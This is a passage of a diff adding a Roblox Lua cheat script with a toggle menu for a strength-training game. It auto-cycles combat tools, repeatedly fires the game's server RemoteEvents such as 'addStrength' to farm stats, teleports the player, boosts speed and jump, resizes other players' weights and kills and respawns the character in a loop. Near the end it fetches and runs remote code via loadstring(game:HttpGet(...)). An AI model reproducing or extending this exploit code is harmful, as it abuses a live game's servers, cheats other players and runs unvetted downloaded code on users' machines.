+
+  if not instance6 or not instance6.Parent then
+    return
+  end
+
+  instance4 = instance6
+
+  connect = instance6.Activated:Connect(function()
+    if flag7 or not flag9 then
+      return
+    end
+
+    task.wait(0.01)
+
+    if instance4 and instance4.Parent and humanoid4 and humanoid4.Health > 0 then
+      f11(instance4)
+    end
+  end)
+end
+
+local v27 = 0
+
+local function f14()
+  if not flag9 or flag7 or #list2 == 0 then
+    return
+  end
+
+  if not humanoid4 or humanoid4.Health <= 0 then
+    return
+  end
+
+  local v28 = tick()
+
+  if v28 - v27 < 0.033 then
+    return
+  end
+
+  v27 = v28
+  flag7 = true
+  flag8 = true
+  f6()
+
+  if #list2 == 0 then
+    flag7 = false
+    flag8 = false
+    return
+  end
+
+  if connect then
+    connect:Disconnect()
+    connect = nil
+  end
+
+  if instance4 then
+    local flag11 = false
+
+    for _, value21 in ipairs(list2) do
+      if value21 == instance4 then
+        flag11 = true
+        break
+      end
+    end
+
+    if not flag11 then
+      table.insert(list2, instance4)
+    end
+
+    instance4.Parent = backpack
+  end
+
+  highest = highest % #list2 + 1
+  local instance7 = list2[highest]
+
+  if instance7 and instance7.Parent then
+    instance7.Parent = backpack
+    humanoid4:EquipTool(instance7)
+    task.wait()
+    f12(instance7)
+  end
+
+  flag8 = false
+  flag7 = false
+end
+
+local function f15(instance8)
+  humanoid4 = instance8:WaitForChild("Humanoid")
+  backpack = localPlayer:WaitForChild("Backpack")
+  instance4 = nil
+  flag6 = true
+  flag7 = false
+  flag8 = false
+  list2 = {}
+  highest = 1
+
+  if connect then
+    connect:Disconnect()
+    connect = nil
+  end
+
+  combatMagazine:ClearAllChildren()
+  local flag12 = false
+
+  for _, value22 in ipairs(backpack:GetChildren()) do
+    if value22:IsA("Tool") and value22.Name == "Combat" then
+      if not flag12 then
+        flag12 = true
+      else
+        f7(value22, backpack)
+      end
+    end
+  end
+
+  backpack.ChildAdded:Connect(function(child2)
+    if not flag9 then
+      return
+    end
+
+    if child2:IsA("Tool") and child2.Name == "Combat" then
+      local v29 = f8(instance8)
+      local combat2 = getCombat(backpack)
+
+      if combat2 and combat2 ~= child2 or v29 then
+        f7(child2, backpack)
+      elseif not flag7 and (not instance4 or not instance4.Parent) then
+        humanoid4:EquipTool(child2)
+        f12(child2)
+      end
+    end
+  end)
+
+  instance8.ChildAdded:Connect(function(child3)
+    if not flag9 then
+      return
+    end
+
+    if child3:IsA("Tool") and child3.Name == "Combat" then
+      if not flag7 and instance4 ~= child3 then
+        f12(child3)
+      end
+    end
+  end)
+
+  instance8.ChildRemoved:Connect(function(child4)
+    if child4:IsA("Tool") and child4.Name == "Combat" then
+      if flag8 then
+        return
+      end
+
+      flag7 = false
+
+      if connect then
+        connect:Disconnect()
+        connect = nil
+      end
+
+      instance4 = nil
+    end
+  end)
+
+  local v30 = f8(instance8)
+
+  if v30 then
+    f12(v30)
+  end
+
+  local connect2
+
+  connect2 = runService.Heartbeat:Connect(function()
+    if not flag6 then
+      connect2:Disconnect()
+      return
+    end
+
+    if not flag9 then
+      return
+    end
+
+    if not flag7 and (not instance4 or not instance4.Parent) then
+      f13()
+    end
+  end)
+
+  task.spawn(function()
+    while flag6 do
+      if flag9 and #list2 > 0 and not flag7 then
+        f14()
+      end
+
+      task.wait()
+    end
+  end)
+
+  task.spawn(function()
+    while flag6 do
+      if flag9 then
+        f9()
+      end
+
+      task.wait(2)
+    end
+  end)
+
+  humanoid4.Died:Connect(function()
+    flag6 = false
+    instance4 = nil
+    flag7 = false
+    flag8 = false
+
+    if connect then
+      connect:Disconnect()
+      connect = nil
+    end
+
+    combatMagazine:ClearAllChildren()
+    list2 = {}
+    highest = 1
+  end)
+end
+
+if localPlayer.Character then
+  task.spawn(f15, localPlayer.Character)
+end
+
+localPlayer.CharacterAdded:Connect(f15)
+local flag13 = false
+local flag14 = false
+local flag15 = false
+local flag16 = false
+local flag17 = false
+local flag18 = false
+local flag19 = false
+local flag20 = false
+local flag21 = false
+local flag22 = false
+local v31 = {}
+local f16
+
+local function f17(instance9)
+  if not instance9:IsA("Tool") then
+    return
+  end
+
+  if not instance9.Name:lower():find("weight") then
+    return
+  end
+
+  local handle = instance9:FindFirstChild("Handle")
+
+  if handle then
+    f16(handle)
+  end
+end
+
+function f16(instance10)
+  local mesh = instance10:FindFirstChild("Mesh")
+
+  if not mesh then
+    return
+  end
+
+  local v32 = tostring(mesh:GetFullName())
+
+  if not v31[v32] then
+    v31[v32] = {
+      color = instance10.Color,
+      material = instance10.Material,
+      castShadow = instance10.CastShadow,
+      textureId = mesh.TextureId,
+      vertexColor = mesh.VertexColor,
+    }
+  end
+
+  instance10.Color = Color3.fromRGB(0, 255, 0)
+  instance10.Material = Enum.Material.ForceField
+  instance10.CastShadow = true
+
+  mesh.MeshId = "rbxassetid://122333663"
+  mesh.TextureId = "rbxassetid://122333759"
+  mesh.VertexColor = Vector3.new(0, 1, 0)
+
+  local newTrail = instance10:FindFirstChild("NewTrail")
+
+  if newTrail and newTrail:IsA("Trail") then
+    newTrail.Enabled = true
+    newTrail.Color = ColorSequence.new(Color3.fromRGB(0, 255, 0))
+    newTrail.Brightness = 2
+    newTrail.LightEmission = 0.5
+    newTrail.LightInfluence = 0
+    newTrail.Lifetime = 0.1
+
+    newTrail.WidthScale = NumberSequence.new({
+      NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(0.202067, 1),
+      NumberSequenceKeypoint.new(1, 1),
+    })
+  end
+
+  local newTrail2 = instance10:FindFirstChild("NewTrail2")
+
+  if newTrail2 and newTrail2:IsA("Trail") then
+    newTrail2.Enabled = true
+    newTrail2.Color = ColorSequence.new(Color3.fromRGB(0, 255, 0))
+    newTrail2.Brightness = 2
+    newTrail2.LightEmission = 0.5
+    newTrail2.LightInfluence = 0
+    newTrail2.Lifetime = 0.15
+
+    newTrail2.WidthScale = NumberSequence.new({
+      NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(0.202067, 1),
+      NumberSequenceKeypoint.new(1, 1),
+    })
+  end
+end
+
+local function f18()
+  local backpack4 = localPlayer:FindFirstChild("Backpack")
+  local character9 = localPlayer.Character
+
+  if backpack4 then
+    for _, value23 in ipairs(backpack4:GetChildren()) do
+      f17(value23)
+    end
+  end
+
+  if character9 then
+    for _, value24 in ipairs(character9:GetChildren()) do
+      f17(value24)
+    end
+  end
+end
+
+textButton12.MouseButton1Click:Connect(function()
+  flag21 = not flag21
+
+  textButton12.BackgroundColor3 = flag21 and Color3.fromRGB(40, 100, 40)
+    or Color3.fromRGB(10, 10, 10)
+end)
+
+runService.Heartbeat:Connect(function()
+  if flag21 then
+    f18()
+  end
+end)
+
+local list3 = {}
+local v33 = {}
+
+local v34 = {
+  weight = Vector3.new(1, 1, 1),
+  ["double weight"] = Vector3.new(2, 2, 2),
+  ["triple weight"] = Vector3.new(3, 3, 3),
+}
+
+local function f19(lower)
+  if lower:find("triple weight") then
+    return v34["triple weight"]
+  elseif lower:find("double weight") then
+    return v34["double weight"]
+  end
+
+  if lower:find("weight") then
+    return v34.weight
+  end
+
+  return nil
+end
+
+local function f20(instance11)
+  if not instance11:IsA("Tool") then
+    return
+  end
+
+  local handle2 = instance11:FindFirstChild("Handle")
+
+  if not handle2 then
+    return
+  end
+
+  local mesh2 = handle2:FindFirstChild("Mesh")
+
+  if not mesh2 then
+    return
+  end
+
+  if v33[mesh2] then
+    v33[mesh2]:Disconnect()
+    v33[mesh2] = nil
+  end
+
+  mesh2.Scale = Vector3.new(7.8312, 7.4312, 7.4312)
+end
+
+local f21
+
+local function f22(instance12)
+  for _, value25 in ipairs(instance12:GetChildren()) do
+    f21(value25)
+  end
+
+  local connect3 = instance12.ChildAdded:Connect(function(child5)
+    if flag22 then
+      f21(child5)
+    end
+  end)
+
+  table.insert(list3, connect3)
+end
+
+function f21(instance13)
+  if not instance13:IsA("Tool") then
+    return
+  end
+
+  local scale = f19((instance13.Name:lower()))
+
+  if not scale then
+    return
+  end
+
+  local handle3 = instance13:FindFirstChild("Handle")
+
+  if not handle3 then
+    return
+  end
+
+  local mesh3 = handle3:FindFirstChild("Mesh")
+
+  if not mesh3 then
+    return
+  end
+
+  mesh3.Scale = scale
+
+  if v33[mesh3] then
+    return
+  end
+
+  local connect4 = mesh3:GetPropertyChangedSignal("Scale"):Connect(function()
+    if flag22 and mesh3.Scale ~= scale then
+      mesh3.Scale = scale
+    end
+  end)
+
+  v33[mesh3] = connect4
+  table.insert(list3, connect4)
+end
+
+local function f23(player)
+  local character10 = player.Character
+
+  if character10 then
+    f22(character10)
+  end
+
+  local connect5 = player.CharacterAdded:Connect(function(character11)
+    if flag22 then
+      f22(character11)
+    end
+  end)
+
+  table.insert(list3, connect5)
+end
+
+local function f24()
+  for _, value26 in pairs(list3) do
+    value26:Disconnect()
+  end
+
+  list3 = {}
+  v33 = {}
+  local backpack5 = localPlayer:FindFirstChild("Backpack")
+
+  if backpack5 then
+    f22(backpack5)
+  end
+
+  local character12 = localPlayer.Character
+
+  if character12 then
+    f22(character12)
+  end
+
+  local connect6 = localPlayer.CharacterAdded:Connect(function(character13)
+    if flag22 then
+      f22(character13)
+    end
+  end)
+
+  table.insert(list3, connect6)
+
+  for _, value27 in ipairs(players:GetPlayers()) do
+    f23(value27)
+  end
+
+  local connect7 = players.PlayerAdded:Connect(function(player2)
+    if flag22 then
+      f23(player2)
+    end
+  end)
+
+  table.insert(list3, connect7)
+end
+
+local function f25()
+  for _, value28 in pairs(list3) do
+    value28:Disconnect()
+  end
+
+  list3 = {}
+
+  for _, value29 in ipairs(players:GetPlayers()) do
+    local character14 = value29.Character
+
+    if character14 then
+      for _, value30 in ipairs(character14:GetChildren()) do
+        f20(value30)
+      end
+    end
+
+    local backpack6 = value29:FindFirstChild("Backpack")
+
+    if backpack6 then
+      for _, value31 in ipairs(backpack6:GetChildren()) do
+        f20(value31)
+      end
+    end
+  end
+
+  local backpack7 = localPlayer:FindFirstChild("Backpack")
+
+  if backpack7 then
+    for _, value32 in ipairs(backpack7:GetChildren()) do
+      f20(value32)
+    end
+  end
+
+  v33 = {}
+end
+
+textButton13.MouseButton1Click:Connect(function()
+  flag22 = not flag22
+
+  textButton13.BackgroundColor3 = flag22 and Color3.fromRGB(40, 100, 40)
+    or Color3.fromRGB(10, 10, 10)
+
+  if flag22 then
+    f24()
+  else
+    f25()
+  end
+end)
+
+local function f26()
+  local humanoid5 = (localPlayer.Character or localPlayer.CharacterAdded:Wait()):WaitForChild("Humanoid")
+
+  if flag19 then
+    humanoid5.JumpPower = 65
+    humanoid5.UseJumpPower = true
+  else
+    humanoid5.JumpPower = 50
+  end
+end
+
+localPlayer.CharacterAdded:Connect(function(character15)
+  f26()
+  local humanoid6 = character15:WaitForChild("Humanoid")
+  loadAnimation = nil
+
+  if flag4 then
+    task.wait(1)
+
+    local animator3 = humanoid6:FindFirstChildOfClass("Animator")
+      or Instance.new("Animator", humanoid6)
+
+    local animation2 = Instance.new("Animation")
+    animation2.AnimationId = "rbxassetid://82682811348660"
+    animation2.Parent = workspace
+
+    loadAnimation = animator3:LoadAnimation(animation2)
+    loadAnimation.Priority = Enum.AnimationPriority.Action4
+    loadAnimation.Looped = true
+    loadAnimation:Play()
+  end
+end)
+
+local function f27()
+  local character16 = localPlayer.Character
+  local humanoid7
+
+  if character16 then
+    humanoid7 = character16:FindFirstChildOfClass("Humanoid")
+
+    if humanoid7 then
+      pcall(function() humanoid7:UnequipTools() end)
+    end
+  end
+end
+
+local function f28()
+  textButton2.BackgroundColor3 = flag13 and Color3.fromRGB(40, 100, 40)
+    or Color3.fromRGB(10, 10, 10)
+
+  textButton3.BackgroundColor3 = flag14 and Color3.fromRGB(40, 100, 40)
+    or Color3.fromRGB(10, 10, 10)
+
+  textButton4.BackgroundColor3 = flag15 and Color3.fromRGB(40, 100, 40)
+    or Color3.fromRGB(10, 10, 10)
+
+  textButton5.BackgroundColor3 = flag18 and Color3.fromRGB(40, 100, 40)
+    or Color3.fromRGB(10, 10, 10)
+
+  textButton6.BackgroundColor3 = flag17 and Color3.fromRGB(40, 100, 40)
+    or Color3.fromRGB(10, 10, 10)
+
+  textButton7.BackgroundColor3 = flag16 and Color3.fromRGB(40, 100, 40)
+    or Color3.fromRGB(10, 10, 10)
+end
+
+textButton2.MouseButton1Click:Connect(function()
+  flag13 = not flag13
+
+  if flag13 then
+    flag17 = false
+    flag18 = false
+    flag16 = false
+  end
+
+  f28()
+end)
+
+textButton3.MouseButton1Click:Connect(function()
+  flag14 = not flag14
+
+  if flag14 then
+    flag17 = false
+    flag18 = false
+    flag16 = false
+  end
+
+  f28()
+end)
+
+textButton4.MouseButton1Click:Connect(function()
+  flag15 = not flag15
+
+  if flag15 then
+    flag17 = false
+    flag18 = false
+    flag16 = false
+  end
+
+  f28()
+end)
+
+textButton6.MouseButton1Click:Connect(function()
+  flag17 = not flag17
+
+  if flag17 then
+    flag13 = false
+    flag14 = false
+    flag15 = false
+    flag18 = false
+    flag16 = false
+  end
+
+  f28()
+end)
+
+textButton5.MouseButton1Click:Connect(function()
+  flag18 = not flag18
+
+  if flag18 then
+    flag13 = false
+    flag14 = false
+    flag15 = false
+    flag17 = false
+    flag16 = false
+  end
+
+  f28()
+end)
+
+textButton7.MouseButton1Click:Connect(function()
+  flag16 = not flag16
+
+  if flag16 then
+    flag13 = false
+    flag14 = false
+    flag15 = false
+    flag18 = false
+    flag17 = false
+  end
+
+  f28()
+end)
+
+textButton14.MouseButton1Click:Connect(function()
+  flag19 = not flag19
+
+  textButton14.BackgroundColor3 = flag19 and Color3.fromRGB(40, 100, 40)
+    or Color3.fromRGB(10, 10, 10)
+
+  f26()
+end)
+
+textButton15.MouseButton1Click:Connect(function()
+  flag9 = not flag9
+
+  textButton15.BackgroundColor3 = flag9 and Color3.fromRGB(40, 100, 40)
+    or Color3.fromRGB(10, 10, 10)
+
+  if not flag9 then
+    flag7 = false
+    flag8 = false
+
+    if connect then
+      connect:Disconnect()
+      connect = nil
+    end
+
+    instance4 = nil
+    local character17 = localPlayer.Character
+
+    if character17 then
+      local humanoid8 = character17:FindFirstChildOfClass("Humanoid")
+
+      if humanoid8 then
+        local animator4 = humanoid8:FindFirstChildOfClass("Animator")
+
+        if animator4 then
+          for _, value33 in pairs(animator4:GetPlayingAnimationTracks()) do
+            value33:Stop()
+          end
+        end
+      end
+    end
+  end
+end)
+
+textButton10.MouseButton1Click:Connect(function()
+  flag20 = not flag20
+
+  textButton10.BackgroundColor3 = flag20 and Color3.fromRGB(40, 100, 40)
+    or Color3.fromRGB(10, 10, 10)
+end)
+
+textButton11.MouseButton1Click:Connect(function()
+  local character18 = localPlayer.Character
+
+  if character18 then
+    for _, value34 in ipairs(character18:GetChildren()) do
+      if value34:IsA("Tool") then
+        value34.Parent = workspace
+      end
+    end
+  end
+end)
+
+textButton8.MouseButton1Click:Connect(function()
+  local character19 = localPlayer.Character
+
+  if character19 and character19:FindFirstChild("HumanoidRootPart") then
+    local vector = Vector3.new(0, 100000, 0)
+    character19.HumanoidRootPart.CFrame = CFrame.new(vector + Vector3.new(0, 5, 0))
+
+    local part = Instance.new("Part")
+    part.Size = Vector3.new(500, 1, 500)
+    part.Position = vector
+    part.Anchored = true
+    part.BrickColor = BrickColor.new("Dark stone grey")
+    part.Parent = workspace
+  end
+end)
+
+local function f29()
+  local character20 = localPlayer.Character
+  local list4 = {}
+  local backpack8 = localPlayer:FindFirstChild("Backpack")
+
+  if backpack8 then
+    for _, value35 in ipairs(backpack8:GetChildren()) do
+      if string.find(value35.Name:lower(), "double weight") then
+        table.insert(list4, value35)
+      end
+    end
+  end
+
+  if character20 then
+    for _, value36 in ipairs(character20:GetChildren()) do
+      if value36:IsA("Tool") and string.find(value36.Name:lower(), "double weight") then
+        table.insert(list4, value36)
+      end
+    end
+  end
+
+  for _, value37 in ipairs(list4) do
+    pcall(function()
+      if value37 and value37.Parent then
+        if character20 then
+          value37.Parent = character20
+        end
+
+        value37.Parent = workspace
+      end
+    end)
+  end
+end
+
+local mouseButton1Click2 = textButton9.MouseButton1Click
+local connect8 = mouseButton1Click2.Connect
+
+local function f30()
+  local character21 = localPlayer.Character
+  local list5 = {}
+  local backpack9 = localPlayer:FindFirstChild("Backpack")
+
+  if backpack9 then
+    for _, value38 in ipairs(backpack9:GetChildren()) do
+      if string.find(value38.Name:lower(), "triple weight") then
+        table.insert(list5, value38)
+      end
+    end
+  end
+
+  if character21 then
+    for _, value39 in ipairs(character21:GetChildren()) do
+      if value39:IsA("Tool") and string.find(value39.Name:lower(), "triple weight") then
+        table.insert(list5, value39)
+      end
+    end
+  end
+
+  for _, value40 in ipairs(list5) do
+    pcall(function()
+      if value40 and value40.Parent then
+        if character21 then
+          value40.Parent = character21
+        end
+
+        value40.Parent = workspace
+      end
+    end)
+  end
+end
+
+connect8(mouseButton1Click2, function()
+  local character22 = localPlayer.Character
+
+  if character22 and character22:FindFirstChild("HumanoidRootPart") then
+    character22.HumanoidRootPart.CFrame = CFrame.new(2.03, 82.54, -5.64)
+  end
+end)
+
+local function f31()
+  local character23 = localPlayer.Character
+  local list6 = {}
+  local backpack10 = localPlayer:FindFirstChild("Backpack")
+
+  if backpack10 then
+    for _, value41 in ipairs(backpack10:GetChildren()) do
+      if value41.Name:lower() == "weight" then
+        table.insert(list6, value41)
+      end
+    end
+  end
+
+  if character23 then
+    for _, value42 in ipairs(character23:GetChildren()) do
+      if value42:IsA("Tool") and value42.Name:lower() == "weight" then
+        table.insert(list6, value42)
+      end
+    end
+  end
+
+  for _, value43 in ipairs(list6) do
+    pcall(function()
+      if value43 and value43.Parent then
+        if character23 then
+          value43.Parent = character23
+        end
+
+        value43.Parent = workspace
+      end
+    end)
+  end
+end
+
+local function f32(instance14)
+  if not instance14 then
+    return
+  end
+
+  if string.find(instance14.Name:lower(), "triple weight") then
+    local findFirstChild2 = instance14:FindFirstChild("h", true)
+    local handle4 = instance14:FindFirstChild("Handle")
+
+    if findFirstChild2 and findFirstChild2:IsA("RemoteEvent") and handle4 then
+      findFirstChild2:FireServer(handle4, true, false)
+    end
+
+    local addStrength = replicatedStorage:FindFirstChild("addStrength")
+
+    if addStrength then
+      addStrength:FireServer()
+    end
+  elseif string.find(instance14.Name:lower(), "double weight") then
+    local findFirstChild3 = instance14:FindFirstChild("h", true)
+    local handle5 = instance14:FindFirstChild("Handle")
+
+    if findFirstChild3 and findFirstChild3:IsA("RemoteEvent") and handle5 then
+      findFirstChild3:FireServer(handle5, true, false)
+    end
+
+    local addStrength2 = replicatedStorage:FindFirstChild("addStrength")
+
+    if addStrength2 then
+      addStrength2:FireServer()
+    end
+  elseif instance14.Name:lower() == "weight" then
+    local addStrength3 = replicatedStorage:FindFirstChild("addStrength")
+
+    if addStrength3 then
+      addStrength3:FireServer()
+    end
+  end
+end
+
+userInputService.JumpRequest:Connect(function()
+  if flag19 then
+    local character24 = localPlayer.Character
+
+    if character24 and character24:FindFirstChildOfClass("Humanoid") then
+      character24:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
+    end
+  end
+end)
+
+runService.Heartbeat:Connect(function(delta)
+  local character25 = localPlayer.Character
+
+  if character25 and flag19 then
+    local humanoid9 = character25:FindFirstChildOfClass("Humanoid")
+
+    if humanoid9 then
+      humanoid9.WalkSpeed = 30
+    end
+
+    if humanoid9 and humanoid9.MoveDirection.Magnitude > 0 then
+      character25:TranslateBy(humanoid9.MoveDirection * (humanoid9.WalkSpeed * 2 * delta))
+    end
+  end
+end)
+
+task.spawn(function()
+  while true do
+    local character26 = localPlayer.Character
+
+    if character26 and character26:FindFirstChild("Humanoid") then
+      if flag19 then
+        if character26.Humanoid.JumpPower ~= 65 then
+          character26.Humanoid.JumpPower = 65
+          character26.Humanoid.UseJumpPower = true
+        end
+
+        character26.Humanoid.WalkSpeed = 30
+      elseif character26.Humanoid.WalkSpeed == 30 then
+        character26.Humanoid.WalkSpeed = 16
+      end
+    end
+
+    task.wait(1)
+  end
+end)
+
+task.spawn(function()
+  while true do
+    if flag20 then
+      local character27 = localPlayer.Character
+
+      local upperTorso = character27
+        and (character27:FindFirstChild("UpperTorso") or character27:FindFirstChild("Torso"))
+
+      if upperTorso then
+        for _, value44 in ipairs(workspace:GetChildren()) do
+          if value44:IsA("Tool")
+            and (value44.Name:lower() == "weight"
+              or string.find(value44.Name:lower(), "double weight")
+              or string.find(value44.Name:lower(), "triple weight")) then
+            local handle6 = value44:FindFirstChild("Handle")
+
+            if handle6 and handle6:IsA("BasePart") then
+              pcall(function() handle6.CFrame = upperTorso.CFrame end)
+            end
+          end
+        end
+      end
+    end
+
+    task.wait(0.5)
+  end
+end)
+
+task.spawn(function()
+  while true do
+    local character28 = localPlayer.Character
+    local backpack11 = localPlayer:FindFirstChild("Backpack")
+
+    if flag18 then
+      f31()
+    end
+
+    if flag17 then
+      f29()
+    end
+
+    if flag16 then
+      f30()
+    end
+
+    if flag18 then
+      if character28 and character28:FindFirstChild("HumanoidRootPart")
+        and character28.Humanoid.Health > 0 then
+        f27()
+        local cframe3 = character28.HumanoidRootPart.CFrame
+        character28.HumanoidRootPart.CFrame = cframe3 * CFrame.new(0, 0, 2)
+        task.wait(0.15)
+        character28.Humanoid.Health = 0
+        localPlayer.CharacterAdded:Wait()
+
+        local character29 = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+        character29:WaitForChild("HumanoidRootPart").CFrame = cframe3
+
+        task.wait(1)
+      else
+        task.wait(1)
+      end
+    elseif flag17 then
+      if character28 and character28.Humanoid.Health > 0 and backpack11 then
+        local flag23 = false
+
+        for _, value45 in ipairs(backpack11:GetChildren()) do
+          if not flag17 then
+            break
+          end
+
+          if value45:IsA("Tool")
+            and (string.find(value45.Name:lower(), "double weight")
+              or value45.Name:lower() == "weight") then
+            flag23 = true
+            f27()
+            task.wait(0.02)
+            f32(value45)
+            task.wait(0.02)
+
+            pcall(function()
+              if value45 and backpack11 then
+                value45.Parent = backpack11
+              end
+            end)
+          end
+        end
+
+        if not flag23 then
+          task.wait(0.5)
+        else
+          task.wait(0.04)
+        end
+      else
+        task.wait(1)
+      end
+    elseif flag16 then
+      if character28 and character28.Humanoid.Health > 0 and backpack11 then
+        local flag24 = false
+
+        for _, value46 in ipairs(backpack11:GetChildren()) do
+          if not flag16 then
+            break
+          end
+
+          if value46:IsA("Tool")
+            and (string.find(value46.Name:lower(), "triple weight")
+              or string.find(value46.Name:lower(), "double weight")
+              or value46.Name:lower() == "weight") then
+            flag24 = true
+            f27()
+            task.wait(0.02)
+            f32(value46)
+            task.wait(0.02)
+
+            pcall(function()
+              if value46 and backpack11 then
+                value46.Parent = backpack11
+              end
+            end)
+          end
+        end
+
+        if not flag24 then
+          task.wait(0.5)
+        else
+          task.wait(0.04)
+        end
+      else
+        task.wait(1)
+      end
+    elseif flag15 or flag14 or flag13 then
+      if character28 and character28.Humanoid.Health > 0 and backpack11 then
+        for _, value47 in ipairs(backpack11:GetChildren()) do
+          if value47:IsA("Tool") then
+            local lower2 = value47.Name:lower()
+            local flag25 = false
+
+            if flag15 and string.find(lower2, "triple weight") then
+              flag25 = true
+            end
+
+            if flag14 and string.find(lower2, "double weight") then
+              flag25 = true
+            end
+
+            if flag13 and lower2 == "weight" then
+              flag25 = true
+            end
+
+            if flag25 then
+              f27()
+              task.wait(0.02)
+              f32(value47)
+              task.wait(0.02)
+
+              pcall(function()
+                if value47 and backpack11 then
+                  value47.Parent = backpack11
+                end
+              end)
+            end
+          end
+        end
+
+        task.wait(0.04)
+      else
+        task.wait(1)
+      end
+    else
+      task.wait(0.5)
+    end
+  end
+end)
+
+task.spawn(function()
+  task.wait(0.5)
+
+  if _G.Settings.SpeedAndJump then
+    flag19 = true
+    textButton14.BackgroundColor3 = Color3.fromRGB(40, 100, 40)
+    f26()
+  end
+
+  if _G.Settings.HackWeight then
+    flag21 = true
+    textButton12.BackgroundColor3 = Color3.fromRGB(40, 100, 40)
+  end
+
+  if _G.Settings.SmallWeights then
+    flag22 = true
+    textButton13.BackgroundColor3 = Color3.fromRGB(40, 100, 40)
+    f24()
+  end
+
+  if _G.Settings.AntiFling then
+    flag = true
+    antiFLING.BackgroundColor3 = Color3.fromRGB(40, 100, 40)
+  end
+
+  if _G.Settings.AntiSit then
+    flag2 = true
+    antiSIT.BackgroundColor3 = Color3.fromRGB(40, 100, 40)
+    local uselessMachines2 = workspace.Map:FindFirstChild("Useless Machines")
+
+    if uselessMachines2 then
+      for _, value48 in pairs(uselessMachines2:GetDescendants()) do
+        if value48:IsA("Seat") or value48:IsA("VehicleSeat") then
+          table.insert(list, { instance = value48, originalParent = value48.Parent })
+          value48.Parent = nil
+        end
+      end
+    end
+  end
+
+  if _G.Settings.InfiniteZoom then
+    localPlayer.CameraMaxZoomDistance = 999999
+  end
+
+  if _G.Settings.Shiftlock then
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Shiftlock-72866"))()
+  end
+
+  if _G.Settings.HackCombat then
+    flag9 = true
+    textButton15.BackgroundColor3 = Color3.fromRGB(40, 100, 40)
+  end
+end)
